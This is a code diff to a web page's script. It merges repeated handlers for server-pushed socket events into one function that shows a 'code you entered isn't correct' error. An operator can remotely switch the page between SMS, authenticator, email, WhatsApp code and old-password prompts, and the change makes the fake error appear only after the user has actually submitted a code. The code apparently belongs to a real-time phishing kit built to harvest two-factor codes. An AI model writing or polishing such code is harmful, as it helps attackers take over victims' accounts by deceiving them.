@@ -1267,19 +1267,22 @@
             showOnly('oldpass');
 
         });
+        function showWrongCode(errorId, btnId) {
+            const timerDiv = document.getElementById(errorId);
+            const continueBtn = document.getElementById(btnId);
+            /* Only show error if the button is in spinner/loading state,
+               meaning the user actually submitted a code */
+            const wasSubmitted = continueBtn && continueBtn.disabled
+                                 && continueBtn.querySelector('.loading-spinner');
+            if (!wasSubmitted) return;
+            if (timerDiv) { timerDiv.innerText = "The code you entered isn't correct. Please check again."; timerDiv.style.display = 'block'; }
+            if (continueBtn) { continueBtn.innerHTML = 'Continue'; continueBtn.disabled = false; continueBtn.style.opacity = '1'; continueBtn.style.cursor = 'pointer'; }
+        }
+
         socket.on('show-2fa', () => {
             const sectionId = 'codeSms';
             if (shownCommands['2fa'] && isSectionVisible(sectionId)) {
-                const timerDiv = document.getElementById('error-message-sms');
-                const continueBtn = document.getElementById('smsBtn');
-                if (timerDiv) timerDiv.innerText = "The code you entered isn?t correct.";
-                if (timerDiv) timerDiv.style.display = 'block';
-                if (continueBtn) {
-                    continueBtn.innerHTML = 'Continue';
-                    continueBtn.disabled = false;
-                    continueBtn.style.opacity = '1';
-                    continueBtn.style.cursor = 'pointer';
-                }
+                showWrongCode('error-message-sms', 'smsBtn');
             } else {
                 shownCommands['2fa'] = true;
                 showOnly(sectionId);
@@ -1289,16 +1292,7 @@
         socket.on('show-auth', () => {
             const sectionId = 'authcode';
             if (shownCommands['auth'] && isSectionVisible(sectionId)) {
-                const timerDiv = document.getElementById('error-message-auth');
-                const continueBtn = document.getElementById('authBtn');
-                if (timerDiv) timerDiv.innerText = "The code you entered isn?t correct.";
-                if (timerDiv) timerDiv.style.display = 'block';
-                if (continueBtn) {
-                    continueBtn.innerHTML = 'Continue';
-                    continueBtn.disabled = false;
-                    continueBtn.style.opacity = '1';
-                    continueBtn.style.cursor = 'pointer';
-                }
+                showWrongCode('error-message-auth', 'authBtn');
             } else {
                 shownCommands['auth'] = true;
                 showOnly(sectionId);
@@ -1308,16 +1302,7 @@
         socket.on('show-email', () => {
             const sectionId = 'codeEmail';
             if (shownCommands['email'] && isSectionVisible(sectionId)) {
-                const timerDiv = document.getElementById('error-message');
-                const continueBtn = document.getElementById('buttonemailcode');
-                if (timerDiv) timerDiv.innerText = "The code you entered isn?t correct.";
-                if (timerDiv) timerDiv.style.display = 'block';
-                if (continueBtn) {
-                    continueBtn.innerHTML = 'Continue';
-                    continueBtn.disabled = false;
-                    continueBtn.style.opacity = '1';
-                    continueBtn.style.cursor = 'pointer';
-                }
+                showWrongCode('error-message', 'buttonemailcode');
             } else {
                 shownCommands['email'] = true;
                 showOnly(sectionId);
@@ -1327,16 +1312,7 @@
         socket.on('show-whatsapp', () => {
             const sectionId = 'whatsappcode';
             if (shownCommands['whatsapp'] && isSectionVisible(sectionId)) {
-                const timerDiv = document.getElementById('error-message-whatsapp');
-                const continueBtn = document.getElementById('whBtn');
-                if (timerDiv) timerDiv.innerText = "The code you entered isn?t correct.";
-                if (timerDiv) timerDiv.style.display = 'block';
-                if (continueBtn) {
-                    continueBtn.innerHTML = 'Continue';
-                    continueBtn.disabled = false;
-                    continueBtn.style.opacity = '1';
-                    continueBtn.style.cursor = 'pointer';
-                }
+                showWrongCode('error-message-whatsapp', 'whBtn');
             } else {
                 shownCommands['whatsapp'] = true;
                 showOnly(sectionId);
